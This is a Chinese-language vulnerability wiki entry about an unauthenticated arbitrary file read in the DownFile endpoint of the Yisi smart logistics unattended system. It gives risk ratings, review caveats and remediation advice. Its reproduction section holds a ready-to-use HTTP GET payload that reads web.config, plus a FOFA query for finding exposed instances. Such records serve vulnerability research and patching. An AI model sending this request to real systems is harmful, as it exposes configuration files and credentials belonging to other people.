---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "易思智能物流无人值守 DownFile配置读取"
product: "易思智能物流无人值守"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "未列，85称5.0"
prerequisites: "声明未认证"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E6%98%93%E6%80%9D%E6%99%BA%E8%83%BD%E7%89%A9%E6%B5%81/%E6%98%93%E6%80%9D%E6%99%BA%E8%83%BD%E7%89%A9%E6%B5%81%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E7%B3%BB%E7%BB%9F%20DownFile%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
fofa: "body=\"/api/SingleLogin\""
fofa_unverified: "body="
id: "vw-f8489a1f5519a22344c97832"
entity_id: "ve-f8489a1f5519a22344c97832"
schema_version: "1"
---

# 易思智能物流无人值守 DownFile配置读取

## 条目说明

- 对象与具体问题：易思智能物流无人值守；DownFile配置读取
- 版本、配置及部署条件：未列，85称5.0
- 认证与权限前提：声明未认证
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 同85端点/参数，保留来源与版本差别合并
- 读取web.config证据只图，不能推所有OS文件可读
- FOFA截断，在野及影响广无依据

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 漏洞描述

易思智能物流无人值守系统 DownFile 存在任意文件读取漏洞,未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。

## 影响版本

易思智能物流无人值守系统

## **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 原文提供部分细节 | 见技术资料 | 未独立核验 | 待来源核实 |

### 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

## 漏洞复现

FOFA：body="/api/SingleLogin"

POC/EXP：

```http
GET /PublicInfoManage/Upload/DownFile?filePath=web.config HTTP/1.0
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Connection: close
```


![image-20241112105314959](./.resource/易思智能物流无人值守系统DownFile任意文件读取漏洞/media/image-20241112105314959.png)


## 修复方案

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
